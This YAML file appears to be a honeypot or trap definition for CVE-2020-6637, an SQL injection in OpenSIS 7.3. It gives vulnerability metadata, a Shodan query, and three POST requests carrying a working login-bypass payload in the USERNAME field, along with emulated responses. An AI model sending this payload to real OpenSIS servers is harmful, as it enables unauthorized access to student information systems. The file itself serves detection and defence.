id: CVE-2020-6637
info:
  name: OpenSIS 7.3 - SQL Injection
  author: pikpikcu
  description: OpenSIS Community Edition version 7.3 is vulnerable to SQL injection
    via the USERNAME parameter of index.php.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    manipulation, or data leakage.

    '
  remediation: 'Apply the latest security patch or upgrade to a patched version of
    OpenSIS.

    '
  reference:
  - https://cinzinga.com/CVE-2020-6637/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-6637
  - https://sourceforge.net/projects/opensis-ce/files/
  - https://github.com/OS4ED/openSIS-Responsive-Design/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8
  - https://opensis.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-6637
    cwe-id: CWE-89
    epss-score: 0.02067
    epss-percentile: 0.87871
    cpe: cpe:2.3:a:os4ed:opensis:7.3:*:*:*:community:*:*:*
  metadata:
    max-request: 3
    vendor: os4ed
    product: opensis
    shodan-query: http.title:"openSIS"
  tags: cve,cve2020,sqli,opensis,os4ed
traps:
- request:
    method: POST
    path: /account/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: SQL STATEMENT:<TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1
      WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')</TD>
- request:
    method: POST
    path: /opensis/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
